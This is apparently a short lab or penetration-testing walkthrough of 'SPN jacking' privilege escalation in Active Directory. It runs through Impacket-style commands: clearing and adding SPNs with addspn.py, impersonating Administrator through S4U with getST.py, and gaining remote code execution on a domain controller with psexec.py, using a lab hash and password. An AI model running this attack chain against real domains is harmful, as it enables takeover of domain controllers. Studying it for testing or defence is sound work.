# PRIVESC via SPN Jacking

[https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

1️⃣We Cleared the SPN Configuration

{% code overflow="wrap" %}
```bash
addspn.py --clear -t 'STORAGE$' -u "NOVAFORGE\\STORAGE$" -p 'aad3b435b51404eeaad3b435b51404ee:32ee26974fc4692dc610acbc4cd3ae08' -dc-ip 10.0.0.100 DC.novaforge.local
```
{% endcode %}

👉 This command Removes all SPNs from STORAGE$

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

2️⃣We Added a New SPN via LDAP

{% code overflow="wrap" %}
```bash
addspn.py -t 'DC$' --spn "HTTP/STORAGE.novaforge.local" -u "STORAGE\svc_it_admin" -p 'pa$$w0rd' -dc-ip 10.0.0.100 -t DC.novaforge.local  DC.novaforge.local
```
{% endcode %}

This command - Adds the SPN HTTP/STORAGE.novaforge.localto the object DC$

<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

3️⃣ We Requested a Service Ticket via S4U Impersonation

{% code overflow="wrap" %}
```bash
getST.py -spn HTTP/STORAGE.novaforge.local -impersonate Administrator 'novaforge.local/svc_it_admin:pa$$w0rd' -dc-ip 10.0.0.100 -altservice CIFS/DC.novaforge.local
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

4️⃣ We Loaded the Administrator Kerberos Ticket into the Environment

5️⃣We AchievedRemote Code Execution via PsExec

{% code overflow="wrap" %}
```bash
export KRB5CCNAME=Administrator@CIFS_DC.novaforge.local@NOVAFORGE.LOCAL.ccache
psexec.py -k -no-pass DC.novaforge.local
```
{% endcode %}

